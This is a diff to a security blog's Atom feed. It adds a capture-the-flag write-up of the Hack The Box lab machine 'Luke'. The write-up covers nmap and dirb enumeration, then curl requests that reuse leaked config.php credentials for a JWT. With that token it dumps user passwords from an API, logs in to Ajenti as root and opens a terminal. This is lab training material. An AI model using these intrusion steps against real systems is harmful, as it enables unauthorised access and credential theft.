@@ -4,7 +4,7 @@
  <title>Highway to Root</title>
  <link href="http://localhost:4000/atom.xml" rel="self"/>
  <link href="http://localhost:4000/"/>
- <updated>2019-09-30T11:47:06+02:00</updated>
+ <updated>2019-10-02T21:34:23+02:00</updated>
  <id>http://localhost:4000</id>
  <author>
    <name>Michele Campobasso, Jacopo Cortellazzi, Andrea Melis</name>
@@ -662,6 +662,198 @@ root
 
 &lt;h4 id=&quot;thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-&quot;&gt;Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)&lt;/h4&gt;
 
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Luke - 10.10.10.137</title>
+   <link href="http://localhost:4000/2019/09/20/luke/"/>
+   <updated>2019-09-20T00:00:00+02:00</updated>
+   <id>http://localhost:4000/2019/09/20/luke</id>
+   <content type="html">&lt;p&gt;&lt;em&gt;Write-up by Andrea Melis &lt;a href=&quot;https://twitter.com/wild_boar&quot;&gt;@wild_boar&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;
+
+&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;NMAP&lt;/h3&gt;
+
+&lt;p&gt;As usual we always start with &lt;strong&gt;Nmap&lt;/strong&gt; scanning:&lt;/p&gt;
+
+&lt;pre&gt;root@pentestbox:~# nmap -sC -sV -oA luke 10.10.10.137
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-20 00:13 CEST
+Nmap scan report for 10.10.10.137
+Host is up (0.036s latency).
+Not shown: 996 closed ports
+PORT STATE SERVICE VERSION
+&lt;b&gt;21/tcp open ftp vsftpd 3.0.3+ (ext.1)&lt;/b&gt;
+&lt;b&gt;22/tcp open ssh?&lt;/b&gt;
+&lt;b&gt;80/tcp open http&lt;/b&gt;
+&lt;b&gt;3000/tcp open http Node.js Express framework&lt;/b&gt;
+&lt;b&gt;8000/tcp open http Ajenti http control panel&lt;/b&gt;
+
+&lt;/pre&gt;
+
+&lt;p&gt;It seems there is anonymoys &lt;strong&gt;ftp&lt;/strong&gt; login, so we logged in and there is only one file
+available, which download tell us:&lt;/p&gt;
+
+&lt;pre&gt; $ cat for_Chihiro.txt
+Dear Chihiro !!
+As you told me that you wanted to learn Web Development and Frontend, I can
+give you a little push by showing the sources of
+the actual website I've created .
+Normally you should know where to look but hurry up because I will delete
+them soon because of our security policies !
+
+Derry
+&lt;/pre&gt;
+
+&lt;p&gt;So it may look like there is an hidden website or page somewhere.
+So, first of all we scanned all possible files and folder over the port 80 and 3000
+which look like a website over 80 port:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;./images/luke/port_80_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And over port 3000 a simple node js api service:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;./images/luke/port_3000_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;dirbuster&quot;&gt;DirBuster&lt;/h3&gt;
+
+&lt;p&gt;With dirbuster and big.txt wordlist we found some interesting file such as:&lt;/p&gt;
+
+&lt;pre&gt;
+File found: /config.php - 200
+Dir found: /css/ - 200
+File found: /css/bootstrap.min.css - 200
+File found: /css/scrolling-nav.css - 200File found: /css/signin.css - 200
+&lt;/pre&gt;
+
+&lt;p&gt;Where config.php retrieved us what it looks as db credentials:&lt;/p&gt;
+
+&lt;pre&gt;
+$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword =
+'Zk6heYCyv6ZE9Xcg'; $db = &quot;login&quot;; $conn = new mysqli($dbHost,
+$dbUsername, $dbPassword,$db) or die(&quot;Connect failed: %s\n&quot;. $conn -&amp;gt;
+error);
+&lt;/pre&gt;
+
+&lt;p&gt;But those credentials were incorrect for the login.php and /management login
+which we found with dirb.
+So we start to look at the js api service. We needed to retrieve the available api
+so we used dirb again over this port:&lt;/p&gt;
+
+&lt;pre&gt;
+ $dirb http://10.10.10.137:3000 -w /usr/share/wordlists/dirb/big.txt
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+START_TIME: Fri Sep 20 00:37:31 2019
+URL_BASE: http://10.10.10.137:3000/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Stopping on warning messages
+-----------------
+GENERATED WORDS: 4612
+---- Scanning URL: http://10.10.10.137:3000/ ----
++ http://10.10.10.137:3000/login (CODE:200|SIZE:13)
++ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)
++ http://10.10.10.137:3000/users (CODE:200|SIZE:56)
+-----------------
+END_TIME: Fri Sep 20 00:40:28 2019
+DOWNLOADED: 4612 - FOUND: 3
+&lt;/pre&gt;
+
+&lt;p&gt;So we have a login api and users api.
+Users api needs and authenticaton token probably supplied by the /login api.
+So first we tried to login we the credentials found in the config.php file.&lt;/p&gt;
+
+&lt;pre&gt;
+$ curl --header &quot;Content-Type: application/json&quot; \
+&amp;gt; --request POST \
+&amp;gt; --data '{&quot;password&quot;:&quot;Zk6heYCyv6ZE9Xcg&quot;, &quot;username&quot;:&quot;admin&quot;}' \
+&amp;gt; http://10.10.10.137:3000/login
+{&quot;success&quot;:true,&quot;message&quot;:&quot;Authentication
+successful!&quot;,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2Vybm
+FtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTky
+NzB9.NkXilej8x5JP2MOHRz3SDkgPs3AVz4YEmtg2s_H0siY&quot;}
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Success!!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The post requests give us the access token, which we can use to query the /users
+api:&lt;/p&gt;
+
+&lt;pre&gt;
+$ curl -X GET -H 'Authorization: Bearer
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwi
+aWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTkyNzB9.NkXilej8x5JP2
+MOHRz3SDkgPs3AVz4YEmtg2s_H0siY' http://10.10.10.137:3000/users/
+[{&quot;ID&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Admin&quot;,&quot;Role&quot;:&quot;Superuser&quot;},
+{&quot;ID&quot;:&quot;2&quot;,&quot;name&quot;:&quot;Derry&quot;,&quot;Role&quot;:&quot;Web Admin&quot;},
+{&quot;ID&quot;:&quot;3&quot;,&quot;name&quot;:&quot;Yuri&quot;,&quot;Role&quot;:&quot;Beta Tester&quot;},
+{&quot;ID&quot;:&quot;4&quot;,&quot;name&quot;:&quot;Dory&quot;,&quot;Role&quot;:&quot;Supporter&quot;}]
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Perfect!&lt;/strong&gt; We have users now, let’s try to query one user at time:&lt;/p&gt;
+
+&lt;pre&gt;
+$ curl -X GET \
+&amp;gt; -H 'Authorization: Bearer
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwi
+aWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTkyNzB9.NkXilej8x5JP2
+MOHRz3SDkgPs3AVz4YEmtg2s_H0siY' \
+&amp;gt; http://10.10.10.137:3000/users/Dory
+{&quot;name&quot;:&quot;Dory&quot;,&quot;password&quot;:&quot;5y:!xa=ybfe)/QD&quot;}
+{&quot;name&quot;:&quot;Derry&quot;,&quot;password&quot;:&quot;rZ86wwLvx7jUxtch&quot;}
+bet@tester87
+{&quot;name&quot;:&quot;Admin&quot;,&quot;password&quot;:&quot;WX5b7)&amp;gt;/rp$U)FW&quot;}
+&lt;/pre&gt;
+
+&lt;p&gt;In fact we discovered after several tries that the Derry credentials were correct
+for the /management panel
+And this is what looks like the management panel; we just have some files
+config.php login.php which we already had:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;./images/luke/after_login_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But now we alse have config.json file! Which looks really interesting since
+seems to be something related to ajenti page, which is the login page discovered
+on port 8000:
+This is what login page looks like:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;./images/luke/ajenti_login_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And this is otherwise what the config.json file shows on /management page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;./images/luke/json_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;What is immediately visible is the password field;which seems to be the admin
+password for ajenti login.&lt;/p&gt;
+
+&lt;pre&gt;&lt;b&gt;password &quot;KpMasng6S5EtTy9Z&quot;&lt;/b&gt;&lt;/pre&gt;
+
+&lt;p&gt;So Username root and password KpMasng6S5EtTy9Z:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;./images/luke/logged_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Logged in!!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;ROOT&lt;/h1&gt;
+
+&lt;p&gt;This looks like Ajenti backend and after several google research we noticed that
+there a “Terminal” options which it open a terminal with bash with the user
+privileges, in our case guess what… root!!
+So clicking on terminal and running a new one gave us a perfect shell with root
+priv:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;./images/luke/rooted_luke.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From here we can also of course create a reverse shell to our host machine but
+the flag is already retrieved.&lt;/p&gt;
+
+&lt;h4 id=&quot;thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-&quot;&gt;Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)&lt;/h4&gt;
 </content>
  </entry>
  
